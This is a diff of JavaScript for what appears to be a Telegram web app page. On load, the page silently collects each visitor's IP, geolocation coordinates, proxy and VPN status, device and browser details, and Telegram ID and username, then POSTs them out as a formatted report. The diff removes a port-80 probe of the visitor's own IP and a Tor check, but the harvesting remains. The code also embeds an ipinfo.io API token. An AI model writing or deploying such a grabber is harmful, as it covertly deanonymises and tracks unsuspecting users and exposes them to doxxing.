@@ -45,9 +45,6 @@ document.addEventListener('DOMContentLoaded', function() {
         batteryLevel = battery.level * 100;
     });
 
-   if (!localStorage.getItem('userVisited')) 
-   localStorage.setItem('userVisited', 'true');
-
     screenWidth = window.screen.width;
     screenHeight = window.screen.height;
 
@@ -59,7 +56,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
     const urlParams = new URLSearchParams(window.location.search);
     const userAgent = navigator.userAgent;
-
 
 fetch('https://ipapi.co/json/')
     .then(response => response.json())
@@ -77,10 +73,10 @@ fetch('https://ipapi.co/json/')
         const browser = getBrowserInfo();
         let userid = document.createElement('p');
      
-        let systemTime = new Date();
-        let hours = systemTime.getHours();
-        let minutes = systemTime.getMinutes();
-        let formattedTime = `${hours}:${minutes < 10 ? '0' : ''}${minutes}`;
+       let systemTime = new Date();
+       let hours = systemTime.getHours();
+       let minutes = systemTime.getMinutes();
+       let formattedTime = `${hours}:${minutes}`;
     
        let language = navigator.language
       
@@ -108,23 +104,9 @@ fetch('https://ipapi.co/json/')
 fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
 .then(response => response.json())
 .then(data => {
-  let isProxy = data.privacy && data.privacy.proxy ? true : false;
+  let isProxy = data.proxy ? true : false;
   let isVPN = data.privacy && data.privacy.vpn ? true : false;
-  let isTOR = data.privacy && data.privacy.tor ? true : false;
-
-        const ur = `http://${ip}:80`;
-
-        fetch(ur, { method: 'HEAD' })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Порт 80 открыт");
-                } else {
-                    console.log("Порт 80 закрыт");
-                }
         
-then(resultCheck => {
-    console.log(resultCheck ? "Порт 80 открыт" : "Порт 80 закрыт");
-    
         const message = `
       * Ip 🌐*
     *├ IP: ${ip}*
@@ -135,7 +117,6 @@ then(resultCheck => {
     *├ Timezone IP: ${time}*
     *├ Proxy: ${isProxy}*
     *├ Vpn: ${isVPN}*
-    *├ Tor: ${isTOR}*
     *├ Coordinates: ${longitude} ${latitude},*
       * System 🖥*
     *├ Browser: ${browser}*
@@ -147,7 +128,6 @@ then(resultCheck => {
     *├ Date: ${formedDate} Day of week: ${dayOfWeek}*
     *├ Memory: ${memory} RAM*
     *├ Internet: ${TypeInternet}*
-    *├ Timezone: ${timeZone}*
       *🔍 Account: *
     *├ ID: ${tg.initDataUnsafe.user.id}*
     *├ Username: @${tg.initDataUnsafe.user.username}*
@@ -168,7 +148,6 @@ then(resultCheck => {
             method: 'POST',
             body: formData
         });
-    });
     });
   });
 });
